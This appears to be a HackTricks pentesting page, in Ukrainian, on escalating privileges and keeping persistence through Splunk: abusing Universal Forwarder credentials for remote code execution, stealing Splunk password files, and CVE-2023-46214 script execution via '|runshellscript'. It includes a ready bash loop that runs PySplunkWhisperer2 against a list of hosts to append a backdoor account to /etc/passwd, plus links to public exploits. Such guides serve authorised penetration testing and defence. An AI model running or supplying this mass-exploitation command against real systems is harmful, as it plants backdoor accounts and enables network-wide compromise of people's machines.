# –ü—Ä–∏–≤–∏–ª–µ–≥—ñ—ó —Ç–∞ –ø–æ—Å—Ç—ñ–π–Ω—ñ—Å—Ç—å Splunk LPE

<details>

<summary><strong>–í–∏–≤—á–∞–π—Ç–µ —Ö–∞–∫—ñ–Ω–≥ AWS –≤—ñ–¥ –Ω—É–ª—è –¥–æ –≥–µ—Ä–æ—è –∑</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

–Ü–Ω—à—ñ —Å–ø–æ—Å–æ–±–∏ –ø—ñ–¥—Ç—Ä–∏–º–∫–∏ HackTricks:

* –Ø–∫—â–æ –≤–∏ —Ö–æ—á–µ—Ç–µ –ø–æ–±–∞—á–∏—Ç–∏ –≤–∞—à—É **–∫–æ–º–ø–∞–Ω—ñ—é —Ä–µ–∫–ª–∞–º–æ–≤–∞–Ω—É –Ω–∞ HackTricks** –∞–±–æ **–∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ HackTricks —É PDF** –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ü–õ–ê–ù–ò –ü–Ü–î–ü–ò–°–ö–ò**](https://github.com/sponsors/carlospolop)!
* –û—Ç—Ä–∏–º–∞–π—Ç–µ [**–æ—Ñ—ñ—Ü—ñ–π–Ω–∏–π PEASS & HackTricks –º–µ—Ä—á**](https://peass.creator-spring.com)
* –í—ñ–¥–∫—Ä–∏–π—Ç–µ –¥–ª—è —Å–µ–±–µ [**–°—ñ–º'—é PEASS**](https://opensea.io/collection/the-peass-family), –Ω–∞—à—É –∫–æ–ª–µ–∫—Ü—ñ—é –µ–∫—Å–∫–ª—é–∑–∏–≤–Ω–∏—Ö [**NFT**](https://opensea.io/collection/the-peass-family)
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –Ω–∞ **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **–ü–æ–¥—ñ–ª—ñ—Ç—å—Å—è —Å–≤–æ—ó–º–∏ —Ö–∞–∫—ñ–Ω–≥-—Ç—Ä—é–∫–∞–º–∏, –Ω–∞–¥—Å–∏–ª–∞–π—Ç–µ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) **—ñ** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **—Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤ GitHub**.

</details>

–Ø–∫—â–æ –≤–∏ **–ø—Ä–æ–≤–æ–¥–∏—Ç–µ** –ø–µ—Ä–µ–ª—ñ–∫ –º–∞—à–∏–Ω **–≤–Ω—É—Ç—Ä—ñ—à–Ω—å–æ** –∞–±–æ **–∑–æ–≤–Ω—ñ—à–Ω—å–æ** —ñ –∑–Ω–∞—Ö–æ–¥–∏—Ç–µ **Splunk, —è–∫–∏–π –ø—Ä–∞—Ü—é—î** (–ø–æ—Ä—Ç 8090), —è–∫—â–æ –≤–∞–º –ø–æ—â–∞—Å—Ç–∏—Ç—å –∑–Ω–∞—Ç–∏ **–¥—ñ–π—Å–Ω—ñ –æ–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ**, –≤–∏ –º–æ–∂–µ—Ç–µ **–∑–ª–æ–≤–∂–∏–≤–∞—Ç–∏ —Å–ª—É–∂–±–æ—é Splunk**, —â–æ–± **–≤–∏–∫–æ–Ω–∞—Ç–∏ –æ–±–æ–ª–æ–Ω–∫—É** –≤ —è–∫–æ—Å—Ç—ñ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞, —è–∫–∏–π –∑–∞–ø—É—Å–∫–∞—î Splunk. –Ø–∫—â–æ —Ü–µ –∑–∞–ø—É—â–µ–Ω–æ –≤ —è–∫–æ—Å—Ç—ñ root, –≤–∏ –º–æ–∂–µ—Ç–µ –ø—ñ–¥–≤–∏—â–∏—Ç–∏ –ø—Ä–∏–≤—ñ–ª–µ—ó –¥–æ root.

–¢–∞–∫–æ–∂, —è–∫—â–æ –≤–∏ **–≤–∂–µ root, —ñ —Å–ª—É–∂–±–∞ Splunk –Ω–µ –ø—Ä–æ—Å–ª—É—Ö–æ–≤—É—î –ª–∏—à–µ localhost**, –≤–∏ –º–æ–∂–µ—Ç–µ **–≤–∫—Ä–∞—Å—Ç–∏** —Ñ–∞–π–ª **–ø–∞—Ä–æ–ª—ñ–≤** –∑—ñ —Å–ª—É–∂–±–∏ Splunk —ñ **—Ä–æ–∑—à–∏—Ñ—Ä—É–≤–∞—Ç–∏** –ø–∞—Ä–æ–ª—ñ –∞–±–æ **–¥–æ–¥–∞—Ç–∏ –Ω–æ–≤—ñ** –æ–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ –¥–æ –Ω—å–æ–≥–æ. –Ü –∑–±–µ—Ä—ñ–≥–∞—Ç–∏ –ø–æ—Å—Ç—ñ–π–Ω—ñ—Å—Ç—å –Ω–∞ —Ö–æ—Å—Ç—ñ.

–ù–∞ –ø–µ—Ä—à–æ–º—É –∑–æ–±—Ä–∞–∂–µ–Ω–Ω—ñ –Ω–∏–∂—á–µ –≤–∏ –º–æ–∂–µ—Ç–µ –ø–æ–±–∞—á–∏—Ç–∏, —è–∫ –≤–∏–≥–ª—è–¥–∞—î –≤–µ–±-—Å—Ç–æ—Ä—ñ–Ω–∫–∞ Splunkd.



## –ö–æ—Ä–æ—Ç–∫–∏–π –æ–≥–ª—è–¥ –µ–∫—Å–ø–ª–æ–π—Ç—É Splunk Universal Forwarder Agent

–î–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è –¥–æ–¥–∞—Ç–∫–æ–≤–∏—Ö –≤—ñ–¥–æ–º–æ—Å—Ç–µ–π –ø–µ—Ä–µ–≥–ª—è–Ω—å—Ç–µ –ø–æ—Å—Ç [https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/). –¶–µ –ª–∏—à–µ –∫–æ—Ä–æ—Ç–∫–∏–π –æ–≥–ª—è–¥:

**–û–≥–ª—è–¥ –µ–∫—Å–ø–ª–æ–π—Ç—É:**
–ï–∫—Å–ø–ª–æ–π—Ç, —Å–ø—Ä—è–º–æ–≤–∞–Ω–∏–π –Ω–∞ –∞–≥–µ–Ω—Ç–∞ Splunk Universal Forwarder (UF), –¥–æ–∑–≤–æ–ª—è—î –∞—Ç–∞–∫—É—é—á–∏–º –∑ –ø–∞—Ä–æ–ª–µ–º –∞–≥–µ–Ω—Ç–∞ –≤–∏–∫–æ–Ω—É–≤–∞—Ç–∏ –¥–æ–≤—ñ–ª—å–Ω–∏–π –∫–æ–¥ –Ω–∞ —Å–∏—Å—Ç–µ–º–∞—Ö, –Ω–∞ —è–∫–∏—Ö –ø—Ä–∞—Ü—é—î –∞–≥–µ–Ω—Ç, —â–æ –ø–æ—Ç–µ–Ω—Ü—ñ–π–Ω–æ –º–æ–∂–µ —Å–∫–æ–º–ø—Ä–æ–º–µ—Ç—É–≤–∞—Ç–∏ –≤—Å—é –º–µ—Ä–µ–∂—É.

**–ö–ª—é—á–æ–≤—ñ –º–æ–º–µ–Ω—Ç–∏:**
- –ê–≥–µ–Ω—Ç UF –Ω–µ –ø–µ—Ä–µ–≤—ñ—Ä—è—î –≤—Ö—ñ–¥–Ω—ñ –∑'—î–¥–Ω–∞–Ω–Ω—è –∞–±–æ –∞–≤—Ç–µ–Ω—Ç–∏—á–Ω—ñ—Å—Ç—å –∫–æ–¥—É, —â–æ —Ä–æ–±–∏—Ç—å –π–æ–≥–æ –≤—Ä–∞–∑–ª–∏–≤–∏–º –Ω–∞ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –Ω–µ—Å–∞–Ω–∫—Ü—ñ–æ–Ω–æ–≤–∞–Ω–æ–≥–æ –∫–æ–¥—É.
- –ó–∞–≥–∞–ª—å–Ω—ñ –º–µ—Ç–æ–¥–∏ –æ—Ç—Ä–∏–º–∞–Ω–Ω—è –ø–∞—Ä–æ–ª—ñ–≤ –≤–∫–ª—é—á–∞—é—Ç—å —ó—Ö –∑–Ω–∞—Ö–æ–¥–∂–µ–Ω–Ω—è –≤ –º–µ—Ä–µ–∂–µ–≤–∏—Ö –∫–∞—Ç–∞–ª–æ–≥–∞—Ö, —Ñ–∞–π–ª–æ–≤–∏—Ö —Ä–µ—Å—É—Ä—Å–∞—Ö –∞–±–æ –≤–Ω—É—Ç—Ä—ñ—à–Ω—ñ—Ö –¥–æ–∫—É–º–µ–Ω—Ç–∞—Ü—ñ—è—Ö.
- –£—Å–ø—ñ—à–Ω–∞ –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—è –º–æ–∂–µ –ø—Ä–∏–∑–≤–µ—Å—Ç–∏ –¥–æ –¥–æ—Å—Ç—É–ø—É –Ω–∞ —Ä—ñ–≤–Ω—ñ SYSTEM –∞–±–æ root –Ω–∞ —Å–∫–æ–º–ø—Ä–æ–º–µ—Ç–æ–≤–∞–Ω–∏—Ö —Ö–æ—Å—Ç–∞—Ö, –≤–∏–≤–µ–¥–µ–Ω–Ω—è –¥–∞–Ω–∏—Ö —Ç–∞ –ø–æ–¥–∞–ª—å—à—É —ñ–Ω—Ñ—ñ–ª—å—Ç—Ä–∞—Ü—ñ—é –º–µ—Ä–µ–∂—ñ.

**–í–∏–∫–æ–Ω–∞–Ω–Ω—è –µ–∫—Å–ø–ª–æ–π—Ç—É:**
1. –ê—Ç–∞–∫—É—é—á–∏–π –æ—Ç—Ä–∏–º—É—î –ø–∞—Ä–æ–ª—å –∞–≥–µ–Ω—Ç–∞ UF.
2. –í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î API Splunk –¥–ª—è –≤—ñ–¥–ø—Ä–∞–≤–∫–∏ –∫–æ–º–∞–Ω–¥ –∞–±–æ —Å—Ü–µ–Ω–∞—Ä—ñ—ó–≤ –∞–≥–µ–Ω—Ç–∞–º.
3. –ú–æ–∂–ª–∏–≤—ñ –¥—ñ—ó –≤–∫–ª—é—á–∞—é—Ç—å –≤–∏–ª—É—á–µ–Ω–Ω—è —Ñ–∞–π–ª—ñ–≤, –º–∞–Ω—ñ–ø—É–ª—é–≤–∞–Ω–Ω—è –æ–±–ª—ñ–∫–æ–≤–∏–º–∏ –∑–∞–ø–∏—Å–∞–º–∏ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤ —Ç–∞ –∫–æ–º–ø—Ä–æ–º–µ—Ç–∞—Ü—ñ—é —Å–∏—Å—Ç–µ–º–∏.

**–ù–∞—Å–ª—ñ–¥–∫–∏:**
- –ü–æ–≤–Ω–∞ –∫–æ–º–ø—Ä–æ–º–µ—Ç–∞—Ü—ñ—è –º–µ—Ä–µ–∂—ñ –∑ —Ä—ñ–≤–Ω–µ–º –¥–æ—Å—Ç—É–ø—É SYSTEM/root –Ω–∞ –∫–æ–∂–Ω–æ–º—É —Ö–æ—Å—Ç—ñ.
- –ú–æ–∂–ª–∏–≤—ñ—Å—Ç—å –≤–∏–º–∫–Ω–µ–Ω–Ω—è –≤–µ–¥–µ–Ω–Ω—è –∂—É—Ä–Ω–∞–ª—É –¥–ª—è —É—Ö–∏–ª–µ–Ω–Ω—è –≤—ñ–¥ –≤–∏—è–≤–ª–µ–Ω–Ω—è.
- –í—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω—è –∑–∞–¥–Ω—ñ—Ö –¥–≤–µ—Ä–µ–π –∞–±–æ –≤–∏–º–∞–≥–∞–Ω–Ω—è –≤–∏–∫—É–ø—É.

**–ü—Ä–∏–∫–ª–∞–¥ –∫–æ–º–∞–Ω–¥–∏ –¥–ª—è –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—ó:**
```bash
for i in `cat ip.txt`; do python PySplunkWhisperer2_remote.py --host $i --port 8089 --username admin --password "12345678" --payload "echo 'attacker007:x:1003:1003::/home/:/bin/bash' >> /etc/passwd" --lhost 192.168.42.51;done
```
**–í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞–Ω—ñ –ø—É–±–ª—ñ—á–Ω—ñ –µ–∫—Å–ø–ª–æ–π—Ç–∏:**
* https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2
* https://www.exploit-db.com/exploits/46238
* https://www.exploit-db.com/exploits/46487


## –ó–ª–æ–≤–∂–∏–≤–∞–Ω–Ω—è –∑–∞–ø–∏—Ç–∞–º–∏ Splunk

**–î–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è –¥–æ–¥–∞—Ç–∫–æ–≤–∏—Ö –≤—ñ–¥–æ–º–æ—Å—Ç–µ–π –ø–µ—Ä–µ–≥–ª—è–Ω—å—Ç–µ –ø–æ—Å—Ç [https://blog.hrncirik.net/cve-2023-46214-analysis](https://blog.hrncirik.net/cve-2023-46214-analysis)**

**CVE-2023-46214** –¥–æ–∑–≤–æ–ª—è–≤ –∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ –¥–æ–≤—ñ–ª—å–Ω–∏–π —Å–∫—Ä–∏–ø—Ç –¥–æ **`$SPLUNK_HOME/bin/scripts`** —ñ –ø–æ—Ç—ñ–º –ø–æ—è—Å–Ω—é–≤–∞–≤, —â–æ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –∑–∞–ø–∏—Ç—É –ø–æ—à—É–∫—É **`|runshellscript script_name.sh`** –±—É–ª–æ –º–æ–∂–ª–∏–≤–æ **–≤–∏–∫–æ–Ω–∞—Ç–∏** **—Å–∫—Ä–∏–ø—Ç**, –∑–±–µ—Ä–µ–∂–µ–Ω–∏–π —Ç–∞–º.


<details>

<summary><strong>–í–∏–≤—á–∞–π—Ç–µ —Ö–∞–∫—ñ–Ω–≥ AWS –≤—ñ–¥ –Ω—É–ª—è –¥–æ –≥–µ—Ä–æ—è –∑</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

–Ü–Ω—à—ñ —Å–ø–æ—Å–æ–±–∏ –ø—ñ–¥—Ç—Ä–∏–º–∫–∏ HackTricks:

* –Ø–∫—â–æ –≤–∏ —Ö–æ—á–µ—Ç–µ –ø–æ–±–∞—á–∏—Ç–∏ —Å–≤–æ—é **–∫–æ–º–ø–∞–Ω—ñ—é —Ä–µ–∫–ª–∞–º–æ–≤–∞–Ω—É –≤ HackTricks** –∞–±–æ **–∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ HackTricks —É —Ñ–æ—Ä–º–∞—Ç—ñ PDF**, –ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ü–õ–ê–ù–ò –ü–Ü–î–ü–ò–°–ö–ò**](https://github.com/sponsors/carlospolop)!
* –û—Ç—Ä–∏–º–∞–π—Ç–µ [**–æ—Ñ—ñ—Ü—ñ–π–Ω–∏–π –º–µ—Ä—á PEASS & HackTricks**](https://peass.creator-spring.com)
* –í—ñ–¥–∫—Ä–∏–π—Ç–µ –¥–ª—è —Å–µ–±–µ [**–°—ñ–º'—é PEASS**](https://opensea.io/collection/the-peass-family), –Ω–∞—à—É –∫–æ–ª–µ–∫—Ü—ñ—é –µ–∫—Å–∫–ª—é–∑–∏–≤–Ω–∏—Ö [**NFT**](https://opensea.io/collection/the-peass-family)
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –≤ **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **–ü–æ–¥—ñ–ª—ñ—Ç—å—Å—è —Å–≤–æ—ó–º–∏ —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –Ω–∞–¥—Å–∏–ª–∞–π—Ç–µ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) —Ç–∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤ GitHub.

</details>
